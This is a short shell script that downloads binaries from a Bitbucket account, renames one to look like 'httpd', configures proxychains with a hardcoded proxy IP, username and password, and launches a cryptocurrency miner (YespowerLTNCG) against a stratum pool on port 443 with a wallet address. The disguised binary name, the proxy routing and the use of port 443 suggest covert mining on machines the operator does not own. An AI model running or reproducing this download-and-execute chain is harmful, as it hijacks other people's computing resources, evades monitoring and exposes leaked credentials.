proxy="172.234.39.163" 
port="1080" 
user="yui"  
pass="bian15"
wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x vx
wget -q https://bitbucket.org/indarsza/sanaya/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/indarsza/sanaya/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/indarsza/sanaya/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./vx -a YespowerLTNCG -o stratum+tcp://74.207.229.192:443 -u MR7quZT8SMCvfbnK8zUi9NZB6snmgAWaV6.$(echo $(shuf -i 1-9 -n 1)-yui) -p x -t1
